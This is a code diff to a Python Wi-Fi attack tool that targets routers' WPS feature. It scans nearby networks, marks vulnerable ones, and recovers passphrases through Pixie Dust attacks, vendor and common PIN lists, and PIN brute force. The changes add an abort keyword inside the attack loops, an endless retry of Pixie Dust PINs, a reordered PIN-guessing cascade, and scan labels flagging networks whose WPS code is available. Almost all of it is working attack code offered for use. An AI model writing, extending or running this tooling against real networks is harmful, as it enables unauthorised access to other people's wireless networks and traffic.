@@ -16,9 +16,25 @@ import csv
 from typing import Dict
 import hashlib
 import argparse
+import select
 
-COMMON_PINS = ["12345670", "12345678", "00000000", "11111111", "78945670", "00005678", "99999999"]
+COMMON_PINS = ["", "12345670", "12345678", "00000000", "11111111", "78945670", "00005678", "99999999"]
 TRIED_PINS = set()
+
+
+def check_exit():
+    if select.select([sys.stdin], [], [], 0)[0]:
+        if sys.stdin.readline().strip().lower() == 'ex':
+            print("\nAborting…")
+            sys.exit(0)
+
+
+def user_input(prompt):
+    resp = input(prompt)
+    if resp.lower() == 'ex':
+        print("\nAborting…")
+        sys.exit(0)
+    return resp
 
 vuln_list = [
     "ADSL Router EV-2006-07-27",
@@ -491,6 +507,7 @@ class WPSpin:
 def recvuntil(pipe, what):
     s = ''
     while True:
+        check_exit()
         inp = pipe.stdout.read(1)
         if inp == '':
             return s
@@ -615,6 +632,7 @@ class Companion:
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
         # Waiting for wpa_supplicant control interface initialization
         while True:
+            check_exit()
             ret = self.wpas.poll()
             if ret is not None and ret != 0:
                 raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
@@ -812,7 +830,7 @@ class Companion:
                     number, pin['pin'], pin['name'])
                 print(line)
             while 1:
-                pinNo = input('Select the PIN: ')
+                pinNo = user_input('Select the PIN: ')
                 try:
                     if int(pinNo) in range(1, len(pins)+1):
                         pin = pins[int(pinNo) - 1]['pin']
@@ -855,6 +873,7 @@ class Companion:
             return False
 
         while True:
+            check_exit()
             res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=self.bssid)
             if not res:
                 break
@@ -878,7 +897,7 @@ class Companion:
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
-                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                        if user_input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                             pin = t_pin
                         else:
                             raise FileNotFoundError
@@ -891,13 +910,6 @@ class Companion:
             self.__wps_connection(bssid, pbc_mode=pbc_mode)
             bssid = self.connection_status.bssid
             pin = '<PBC mode>'
-        elif store_pin_on_fail:
-            try:
-                self.__wps_connection(bssid, pin, pixiemode)
-            except KeyboardInterrupt:
-                print("\nAborting…")
-                self.__savePin(bssid, pin)
-                return False
         else:
             self.__wps_connection(bssid, pin, pixiemode)
 
@@ -917,7 +929,12 @@ class Companion:
             if self.pixie_creds.got_all():
                 pin = self.__runPixiewps(pixieforce, self.pixie_another_method)
                 if pin:
-                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                    while True:
+                        if self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True):
+                            return True
+                        print('[!] Pixie Dust PIN failed, retrying connection…')
+                        check_exit()
+                        time.sleep(1)
                 return False
             else:
                 print('[!] Not enough data to run Pixie Dust attack')
@@ -934,6 +951,7 @@ class Companion:
         """
         checksum = self.generator.checksum
         while int(f_half) < 10000:
+            check_exit()
             t = int(f_half + '000')
             pin = '{}000{}'.format(f_half, checksum(t))
             self.single_connection(bssid, pin)
@@ -947,6 +965,7 @@ class Companion:
             self.bruteforce.registerAttempt(f_half)
             if delay:
                 time.sleep(delay)
+            check_exit()
         print('[-] First half not found')
         return False
 
@@ -957,6 +976,7 @@ class Companion:
         """
         checksum = self.generator.checksum
         while int(s_half) < 1000:
+            check_exit()
             t = int(f_half + s_half)
             pin = '{}{}{}'.format(f_half, s_half, checksum(t))
             self.single_connection(bssid, pin)
@@ -969,6 +989,7 @@ class Companion:
             self.bruteforce.registerAttempt(f_half + s_half)
             if delay:
                 time.sleep(delay)
+            check_exit()
         return False
 
     def smart_bruteforce(self, bssid, start_pin=None, delay=None):
@@ -977,7 +998,7 @@ class Companion:
             try:
                 filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                 with open(filename, 'r') as file:
-                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
+                    if user_input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                         mask = file.readline().strip()
                     else:
                         raise FileNotFoundError
@@ -986,26 +1007,16 @@ class Companion:
         else:
             mask = start_pin[:7]
 
-        try:
-            self.bruteforce = BruteforceStatus()
-            self.bruteforce.mask = mask
-            if len(mask) == 4:
-                f_half = self.__first_half_bruteforce(bssid, mask, delay)
-                if f_half and (self.connection_status.status != 'GOT_PSK'):
-                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
-            elif len(mask) == 7:
-                f_half = mask[:4]
-                s_half = mask[4:]
-                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
-            raise KeyboardInterrupt
-        except KeyboardInterrupt:
-            print("\nAborting…")
-            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-            with open(filename, 'w') as file:
-                file.write(self.bruteforce.mask)
-            print('[i] Session saved in {}'.format(filename))
-            if args.loop:
-                raise KeyboardInterrupt
+        self.bruteforce = BruteforceStatus()
+        self.bruteforce.mask = mask
+        if len(mask) == 4:
+            f_half = self.__first_half_bruteforce(bssid, mask, delay)
+            if f_half and (self.connection_status.status != 'GOT_PSK'):
+                self.__second_half_bruteforce(bssid, f_half, '001', delay)
+        elif len(mask) == 7:
+            f_half = mask[:4]
+            s_half = mask[4:]
+            self.__second_half_bruteforce(bssid, f_half, s_half, delay)
 
     def __print_with_indicators(self, level, msg):
         print('[{}] [{}] {}'.format(level, self.lastPwr, msg))
@@ -1164,20 +1175,13 @@ class WiFiScanner:
             return result + ' ' * (length - _str_width(result))
         def colored(text, color=None):
             """Returns colored text"""
-            if color:
-                if color == 'green':
-                    text = '\033[92m{}\033[00m'.format(text)
-                elif color == 'red':
-                    text = '\033[91m{}\033[00m'.format(text)
-                elif color == 'yellow':
-                    text = '\033[93m{}\033[00m'.format(text)
-                elif color == 'orange':
-                    text = '\033[38;5;208m{}\033[00m'.format(text)
-                else:
-                    return text
-            else:
-                return text
-            return text
+            palette = {
+                'green': '\033[92m{}\033[00m',
+                'red': '\033[91m{}\033[00m',
+                'yellow': '\033[93m{}\033[00m',
+                'orange': '\033[38;5;208m{}\033[00m'
+            }
+            return palette.get(color, '{}').format(text)
 
         if self.vuln_list:
             print('Network marks: {1} {0} {2} {0} {3} {0} {4}'.format(
@@ -1189,7 +1193,7 @@ class WiFiScanner:
             ))
         print('Networks list:')
         print('{:<4} {:<18} {:<25} {:<27} {:<}'.format(
-            '#', 'BSSID', 'ESSID', 'WSC device name', 'WSC model'))
+            '#', 'BSSID', 'ESSID (Signal)', 'WSC device name', 'WSC model'))
 
         network_list_items = list(network_list.items())
         if self.reverse:
@@ -1197,33 +1201,32 @@ class WiFiScanner:
         for n, network in network_list_items:
             number = f'{n})'
             model = '{} {}'.format(network['Model'], network['Model number'])
-            essid = truncateStr(network.get('ESSID', 'HIDDEN'), 25)
-            deviceName = truncateStr(network['Device name'], 27)
-    
-            # Processing the display width of other fields
+            essid_sig = f"{network.get('ESSID', 'HIDDEN')} ({network['Level']})"
+            essid = truncateStr(essid_sig, 25)
+            device_name = truncateStr(network['Device name'], 27)
+
             processed_number = truncateStr(number, 4)
             processed_bssid = truncateStr(network['BSSID'], 18)
-            processed_device = deviceName  # 27 columns of width have been processed
-            processed_model = model  # Assuming that the model fields do not need to be truncated or have been processed
 
-            # Directly concatenate the processed fields, separated by spaces in the middle
-            line_parts = [
+            line = ' '.join([
                 processed_number,
                 processed_bssid,
                 essid,
-                processed_device,
-                processed_model
-            ]
-            line = ' '.join(line_parts)
+                device_name,
+                model
+            ])
 
             if network['WPS locked']:
                 print(colored(line, color='red'))
             else:
                 model_pins = generate_model_pins(mac=network['BSSID'], ssid=network.get('ESSID'), model=network['Model'], device=network['Device name'])
                 if model_pins:
-                    print(colored(line, color='yellow'))
+                    print(colored(line, color='yellow'),
+                          colored('WPS code available', color='yellow'))
                 elif generate_suggested_pins(network['BSSID']):
-                    print(colored(line, color='orange'))
+                    print(colored(line, color='orange'),
+                          colored('WPS code can be from other models',
+                                  color='orange'))
                 elif self.vuln_list and (model in self.vuln_list):
                     print(colored(line, color='green'))
                 else:
@@ -1238,7 +1241,7 @@ class WiFiScanner:
             return
         while 1:
             try:
-                networkNo = input('Select target (press Enter to refresh): ')
+                networkNo = user_input('Select target (press Enter to refresh): ')
                 if networkNo.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
@@ -1459,62 +1462,53 @@ if __name__ == '__main__':
         die('Unable to up interface "{}"'.format(args.interface))
 
     while True:
-        try:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose)
-            companion.pixie_another_method = args.pixie_another_method
-            if args.push_button_connect:
-                companion.single_connection(pbc_mode=True)
-            else:
-                essid = None
-                if not args.bssid:
-                    scanner = WiFiScanner(args.interface, vuln_list, args.reverse_scan)
-                    if not args.loop:
-                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
-                    network = scanner.prompt_network()
-                    if network:
-                        args.bssid = network['BSSID']
-                        essid = network.get('ESSID')
-                if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                    companion.pixie_another_method = args.pixie_another_method
-                    if args.pin:
-                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
-                    else:
+        check_exit()
+        companion = Companion(args.interface, args.write, print_debug=args.verbose)
+        companion.pixie_another_method = args.pixie_another_method
+        if args.push_button_connect:
+            companion.single_connection(pbc_mode=True)
+        else:
+            essid = None
+            network = None
+            if not args.bssid:
+                scanner = WiFiScanner(args.interface, vuln_list, args.reverse_scan)
+                if not args.loop:
+                    print('[*] BSSID not specified (--bssid) — scanning for available networks')
+                network = scanner.prompt_network()
+                if network:
+                    args.bssid = network['BSSID']
+                    essid = network.get('ESSID')
+            if args.bssid:
+                companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                companion.pixie_another_method = args.pixie_another_method
+                if args.pin:
+                    companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
+                else:
+                    model = network.get('Model', '') + network.get('Model number', '') if network else ''
+                    device = network.get('Device name', '') if network else ''
+                    if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device)):
                         if args.pixie_dust:
                             print('[*] Trying Pixie Dust attack...')
                             companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
                         if companion.connection_status.status != 'GOT_PSK':
-                            model = network.get('Model', '') + network.get('Model number', '') if 'network' in locals() and network else ''
-                            device = network.get('Device name', '') if 'network' in locals() and network else ''
-                            if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device)):
-                                if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid)):
-                                    if not try_pin_sequence(companion, args.bssid, COMMON_PINS):
+                            if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid)):
+                                if not try_pin_sequence(companion, args.bssid, COMMON_PINS):
+                                    pins = generate_pins(mac=args.bssid, ssid=essid)
+                                    if not try_pin_sequence(companion, args.bssid, pins):
                                         if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p]):
                                             if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p]):
-                                                pins = generate_pins(mac=args.bssid, ssid=essid)
-                                                if not try_pin_sequence(companion, args.bssid, pins):
-                                                    if isinstance(args.bruteforce_pins, str):
-                                                        print('[*] Trying PINs from file...')
-                                                        if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins):
-                                                            print('[-] All PIN attempts failed.')
-                                                    elif args.bruteforce_pins is True:
-                                                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                                                    else:
+                                                if isinstance(args.bruteforce_pins, str):
+                                                    print('[*] Trying PINs from file...')
+                                                    if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins):
                                                         print('[-] All PIN attempts failed.')
-            if not args.loop:
-                break
-            else:
-                args.bssid = None
-        except KeyboardInterrupt:
-            if args.loop:
-                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    print("Aborting…")
-                    break
-                else:
-                    args.bssid = None
-            else:
-                print("\nAborting…")
-                break
+                                                elif args.bruteforce_pins is True:
+                                                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                                                else:
+                                                    print('[-] All PIN attempts failed.')
+        if not args.loop:
+            break
+        else:
+            args.bssid = None
 
     if args.iface_down:
         ifaceUp(args.interface, down=True)
